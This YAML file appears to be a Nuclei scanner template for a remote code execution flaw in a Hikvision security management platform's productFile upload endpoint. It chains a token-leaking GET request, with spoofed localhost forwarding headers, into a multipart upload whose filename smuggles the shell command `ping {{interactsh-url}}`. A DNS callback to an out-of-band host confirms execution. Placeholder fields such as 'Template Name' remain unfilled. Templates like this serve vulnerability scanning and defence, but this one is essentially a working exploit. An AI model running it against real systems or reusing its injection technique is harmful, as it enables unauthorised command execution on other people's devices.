id: hikvision-productFile-rce
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 海康威视部分综合安防管理平台历史版本由于对上传文件接口校验不足，攻击者可以将恶意文件上传到平台，导致获取服务权限或服务异常。
  reference:
    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0productFile%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md?plain=1#L25
  tags: tags
http:
  - raw:
      - |+
        GET //iac/iasService/v1/register HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Accept: application/json, text/javascript, */*; q=0.01
        X-Requested-With: XMLHttpRequest
        If-Modified-Since: Thu, 01 Jun 1970 00:00:00 GMT
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.61 Chrome/126.0.6478.61 Not/A)Brand/8  Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=utf-8
        Referer: http://{{Hostname}}/portal/cas/login/loginPage.do?service=http://{{Hostname}}/portal
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=-maMnC5LtxBBBtzLmkBn2ve0is2YBDs87r198FdG; curtTabId=all; configMenu=
        x-real-ip: 127.0.0.1
        x-forwarded-for: 127.0.0.1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
        Connection: close

      - |-
        POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1
        Host: {{Hostname}}
        {{hk_token}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
        Content-Length: 242

        -----------------------------142851345723692939351758052805
        Content-Disposition: form-data; name="file"; filename="`ping {{interactsh-url}}`.zip"
        Content-Type: application/zip

        123
        -----------------------------142851345723692939351758052805--

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
    extractors:
      - type: regex
        name: hk_token
        internal: true
        part: header_1
        regex:
          - 'Token: ([a-zA-Z0-9]+)'